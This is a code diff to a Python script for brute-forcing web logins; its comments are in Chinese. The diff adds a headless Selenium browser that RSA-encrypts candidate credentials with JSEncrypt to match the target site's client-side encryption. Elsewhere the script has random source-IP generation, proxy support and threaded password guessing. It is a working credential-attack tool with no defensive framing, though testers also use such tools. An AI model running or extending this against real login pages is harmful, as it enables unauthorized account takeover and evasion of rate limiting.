@@ -2,12 +2,15 @@
 
 import requests, urllib3, random, os, traceback, time, binascii, base64, threading, re
 from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
+from urllib3.exceptions import MaxRetryError
 from datetime import datetime, timedelta
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import DES, AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from concurrent import futures
 from lxml import etree
+from selenium.webdriver.chrome.options import Options 
+from selenium import webdriver
 
 # 禁用https警告
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -53,10 +56,6 @@ if 'PASSWORD_FILE_PATH' in vars() and PASSWORD_FILE_PATH:
 # =================== [ 工具函数 ] ===================
 #
 
-# 随机IP生成
-def random_ipv4():
-    return ".".join(str(random.randint(0,255)) for _ in range(4))
-
 # DES加密
 def DES_encrypt(message: str) -> str:
     cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
@@ -94,6 +93,35 @@ YwIDAQAB
     #encrypted = binascii.hexlify(encrypted) # HEX
     return encrypted.decode('utf-8') #.upper()
 
+# 随机IP生成
+def random_ipv4():
+    return ".".join(str(random.randint(0,255)) for _ in range(4))
+
+# 浏览器执行JS脚本
+def selenium_runtime():
+    browser_options = Options()
+    browser_options.add_argument('--headless')
+    browser_options.add_argument('--disable-gpu')
+    browser = webdriver.Chrome(options=browser_options)
+    # 载入网页中的JS脚本
+    browser.get('data:text/html;charset=utf-8,<script src="https://example.com/js/jsencrypt.min.js"></script>')
+    # 载入自定义JS脚本
+    js = r'''
+pk = "-----BEGIN PUBLIC KEY-----\n";
+pk += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2hQp7K25U5kQqE/WFX7f\n";
+pk += "hq+YeaLCps8jiUZfIVmq8w2AtHMgdzsea7KCp1K98pcNg3bvdjBoxyfRB2uox0d8\n";
+pk += "NzE6QZRTHT3LS57n6BVq4z+nGpXw4kiyIZYhflZnKph8pmbI4pucQaOj+0yUIYrs\n";
+pk += "yRsHwAIpeGAxFhmgzGNYdxQ+UwUHk9tZqXdHfIIqd2/rbbbFLO6VnzQstRJTQrwa\n";
+pk += "78NyznlEkmeOXPKMuh/WgrkA3+6cMYH6mnmt3zPzU0YnZDXsSpGViyErRty7s3O5\n";
+pk += "X/u59C8ScMnvk52lVGYsAikAX8sL/rF6JNFke2A5CfSjtKKeGldU8LbWffF457xb\n";
+pk += "yQIDAQAB\n";
+pk += "-----END PUBLIC KEY-----";
+cipher = new JSEncrypt;
+cipher.setPublicKey(pk);
+'''
+    browser.execute_script(js)
+    return browser
+
 #
 # =================== [ 爆破函数 ] ===================
 #
@@ -108,6 +136,10 @@ HEADERS.update({
 COOKIES = {
     'PHPSESSIONID': '0xDEADBEEF'
 }
+
+# 根据需要决定是否启动Selenium
+BROWSER = None
+#BROWSER = selenium_runtime()
 
 # 爆破函数，返回 (has_exception, found_password)
 def run(username, password):
@@ -131,6 +163,10 @@ def run(username, password):
         #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
         #html = etree.HTML(response.text, etree.HTMLParser())
         #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
+        
+        # 这里selenium可以自动识别username和password是string类型，并自动加上双引号
+        #username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
+        #password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)
 
         data = {
             "username": username,
@@ -152,6 +188,10 @@ def run(username, password):
 
     except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
+        return True, False
+    
+    except MaxRetryError as e: # 大概率是 selenium 引起的异常
+        print(f"[x] {datetime.now().strftime('%H:%M:%S')} Selenium has crashed or has been manually closed")
         return True, False
 
     except Exception as e:
@@ -257,8 +297,8 @@ def report_elapsed_time():
     print(f"[+] {now.strftime('%H:%M:%S')} task finished, elapsed {elapsed}")
 
 # 启动进度报告线程
-thread = threading.Thread(target=report_elapsed_time)
-thread.start()
+THREAD = threading.Thread(target=report_elapsed_time)
+THREAD.start()
 
 # 线程池
 with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
@@ -272,5 +312,9 @@ with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
     finally:
         REPORT_THREAD_STOP_SIGNAL.set()
 
+# 要求浏览器退出
+if BROWSER:
+    BROWSER.quit()
+
 # 等待线程退出
-thread.join()
+THREAD.join()
